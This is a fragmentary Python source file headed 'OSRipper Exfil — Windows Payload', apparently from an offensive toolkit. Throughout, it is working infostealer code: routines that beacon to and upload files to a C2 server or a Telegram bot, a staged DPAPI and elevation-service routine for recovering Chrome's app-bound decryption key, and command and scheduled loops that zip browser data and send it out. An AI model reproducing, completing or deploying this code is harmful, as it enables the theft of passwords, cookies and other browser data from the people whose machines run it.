#!/usr/bin/env python3
"""
OSRipper Exfil — Windows Payload
...
def _tg(method, **kw):
    ...
    for attempt in range(5):
        try:
            ...
            data = r.json()
            if not data.get('ok'):
                print(f'[TG] {method} failed ({data.get("error_code","?")}): '
...
def _c2_upload_file(path, caption=''):
    """Upload a file to OSRipper C2 server."""
...
def _c2_beacon(message=''):
    """Send beacon/status to C2 server."""
    if not C2_URL or C2_URL.startswith('__'):
        return
    try:
...
def exfil_send_message(text, chat_id=None):
    """Send message via configured C2 channel(s)."""
...
def exfil_send_file(path, chat_id=None, caption=None):
    """Send file via configured C2 channel(s)."""
    if C2_MODE in ('telegram', 'dual'):
...
def _derive_v20_key(browser_base):
    """Extract and cache the v20 app-bound decryption key for a browser."""
    ...
    try:
        ...
        # Stage 1: user-level DPAPI decrypt
        dec1 = dpapi_decrypt(dpapi_blob)

        # If result is already >= 32 bytes, try it as the AES key directly
        if len(dec1) >= 32:
            key = dec1[-32:]
            _v20_key_cache[cache_key] = key
            return key

        # Stage 2: the first decrypt may yield another DPAPI blob
        try:
        ...
        # Stage 3: try elevation service via PowerShell COM
        try:
...
def handle_command(text, chat_id):
    ...
    if cmd in ('/start', '/help'):
        ...
        try:
            ...
            exfil_send_file(str(zp), chat_id, 'Browser data')
        except Exception as e:
...
def _auto_extract():
    while True:
        ...
        try:
            data = collect_all()
            zp = make_zip(data)
            exfil_send_message(f'Scheduled extraction — {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
...
def run_bot():
    if C2_MODE in ('c2',):
        _c2_beacon('Windows exfil agent online')
        while True:
            try:
                data = collect_all()
                zp = make_zip(data)
